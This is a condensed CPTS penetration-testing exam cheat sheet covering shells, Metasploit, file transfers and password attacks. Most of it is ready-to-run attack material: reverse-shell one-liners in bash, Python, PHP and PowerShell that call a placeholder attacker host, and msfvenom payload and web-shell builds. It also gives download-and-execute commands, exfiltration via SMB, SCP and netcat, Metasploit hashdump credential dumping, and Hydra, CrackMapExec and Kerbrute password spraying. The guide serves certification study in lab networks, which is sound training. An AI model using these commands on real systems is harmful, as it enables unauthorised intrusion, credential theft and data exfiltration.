# 07/08/09/10 — Shells, Metasploit, File Transfers, Password Attacks

These modules overlap heavily with your OSCP guide. This is a condensed CPTS-specific reference covering what's different or needs extra emphasis for the 10-day enterprise exam.

---

## Shells & Payloads — Quick Reference

### Reverse shell one-liners

```bash
# Bash
bash -c 'bash -i >& /dev/tcp/KALI/4444 0>&1'

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("KALI",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# PHP
php -r '$s=fsockopen("KALI",4444);exec("/bin/bash <&3 >&3 2>&3");'

# PowerShell (one-liner for Windows targets)
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('KALI',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r+'PS '+(pwd).Path+'> ');$s.Write($sb,0,$sb.Length)};$c.Close()"
```

### MSFVenom payloads

```bash
# Linux
msfvenom -p linux/x64/shell_reverse_tcp LHOST=KALI LPORT=4444 -f elf -o shell.elf

# Windows
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=4444 -f exe -o shell.exe

# Web shells
msfvenom -p php/reverse_php LHOST=KALI LPORT=4444 -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=KALI LPORT=4444 -f war -o shell.war
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=4444 -f aspx -o shell.aspx

# Staged (smaller, needs multi/handler) vs Stageless (bigger, works with nc)
linux/x64/meterpreter/reverse_tcp     # staged (slash)
linux/x64/meterpreter_reverse_tcp     # stageless (underscore)
```

### Shell stabilization

```bash
# After catching a shell on Linux
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
# Now you have tab completion, clear screen, arrow keys
```

### Listeners

```bash
# Netcat
nc -lvnp 4444

# Metasploit multi/handler (use for staged payloads)
msfconsole -q
use exploit/multi/handler
set PAYLOAD linux/x64/shell_reverse_tcp    # match your msfvenom payload
set LHOST KALI_IP
set LPORT 4444
run
```

---

## Metasploit — CPTS Usage

Unlike the OSCP (which limits Metasploit to one target), the CPTS has no stated Metasploit restrictions. Use it freely.

### Key Metasploit workflows for CPTS

```bash
# Exploit a service
search apache activemq
use exploit/multi/misc/apache_activemq_rce_cve_2023_46604
set RHOSTS TARGET
set LHOST KALI
exploit

# Pivot through a session
sessions -l                          # list sessions
run autoroute -s 172.16.0.0/24      # route internal traffic through session
use auxiliary/server/socks_proxy     # SOCKS proxy for external tools
set SRVPORT 1080
run -j

# Post-exploitation modules
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

# Credential dumping
use post/windows/gather/hashdump
set SESSION 1
run
```

---

## File Transfers — Quick Reference

```bash
# Kali → Linux (Python HTTP server)
python3 -m http.server 80              # on Kali
wget http://KALI/file                  # on target
curl http://KALI/file -o file          # alternative

# Kali → Windows (SMB — best method)
impacket-smbserver share . -smb2support     # on Kali
copy \\KALI\share\file C:\temp\             # on Windows

# Kali → Windows (certutil)
certutil -urlcache -f http://KALI/file C:\temp\file

# Kali → Windows (PowerShell)
iwr http://KALI/file -o file
IEX(New-Object Net.WebClient).DownloadString('http://KALI/script.ps1')

# Target → Kali (exfiltration)
# SMB: copy C:\file \\KALI\share\
# SCP: scp file kali_user@KALI:/tmp/
# NC:  nc KALI 9999 < file  (Kali: nc -lvnp 9999 > file)
```

---

## Password Attacks — CPTS Reference

### Online attacks

```bash
# Hydra — SSH
hydra -l admin -P rockyou.txt ssh://TARGET -t 4 -f

# Hydra — HTTP POST form
hydra -l admin -P rockyou.txt TARGET http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid" -f

# CrackMapExec — SMB spray (MOST USEFUL FOR CPTS)
crackmapexec smb RANGE -u users.txt -p 'Password1!' --continue-on-success

# CrackMapExec — WinRM
crackmapexec winrm RANGE -u user -p pass

# Kerbrute — AD password spray
kerbrute passwordspray -d domain.com users.txt 'Welcome2026!' --dc DC_IP
```

### Offline cracking

```bash
# Hashcat modes you'll use
hashcat -m 0 hash.txt rockyou.txt           # MD5
hashcat -m 1000 hash.txt rockyou.txt        # NTLM
hashcat -m 1800 hash.txt rockyou.txt        # Linux shadow (sha512crypt)
hashcat -m 13100 hash.txt rockyou.txt       # Kerberoast TGS
hashcat -m 18200 hash.txt rockyou.txt       # AS-REP

# With rules (crack harder passwords)
hashcat -m 1000 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# John — auto-detect format
john --wordlist=rockyou.txt hash.txt

# Special file types
ssh2john id_rsa > hash.txt && john --wordlist=rockyou.txt hash.txt
zip2john file.zip > hash.txt && john --wordlist=rockyou.txt hash.txt
keepass2john db.kdbx > hash.txt && john --wordlist=rockyou.txt hash.txt
```

### The CPTS credential reuse loop

```
FIND a credential on any machine
    ↓
TEST it on EVERY service on EVERY host:
    crackmapexec smb ENTIRE_RANGE -u user -p pass
    crackmapexec winrm ENTIRE_RANGE -u user -p pass
    crackmapexec ssh ENTIRE_RANGE -u user -p pass
    ↓
ACCESS new machines → FIND more credentials → REPEAT
```

This loop is the engine that drives progression through the CPTS exam network. A password found on machine 1 might work on machine 5. Always spray everything.
